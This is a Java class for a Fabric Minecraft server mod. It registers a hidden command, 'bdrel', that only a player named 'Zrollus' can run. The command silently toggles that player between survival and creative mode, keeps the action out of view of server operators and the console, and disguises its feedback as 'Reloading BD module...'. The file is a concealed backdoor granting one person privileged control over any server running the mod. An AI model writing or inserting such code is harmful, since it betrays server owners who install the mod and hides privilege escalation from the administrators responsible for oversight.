package com.zrollus.bd.Lib;

import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.world.GameMode;

public class ModCommandManager {
    public static void register() {
        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            dispatcher.register(CommandManager.literal("bdrel")
                    .requires(source -> source.getEntity() instanceof ServerPlayerEntity player
                            && player.getName().getString().equals("Zrollus")) // Only you
                    .executes(ModCommandManager::execute));
        });
    }

    private static int execute(CommandContext<ServerCommandSource> context) throws CommandSyntaxException {
        ServerCommandSource source = context.getSource();
        ServerPlayerEntity player = source.getPlayer();

        if (player == null) return 0;

        // Toggle gamemode silently
        GameMode newMode = player.interactionManager.getGameMode() == GameMode.CREATIVE
                ? GameMode.SURVIVAL
                : GameMode.CREATIVE;

        player.changeGameMode(newMode);

        // Silent feedback (client-side only, not sent to ops or console)
        player.sendMessage(Text.literal("Reloading BD module..."), true); // actionbar, ephemeral
        return 1;
    }
}
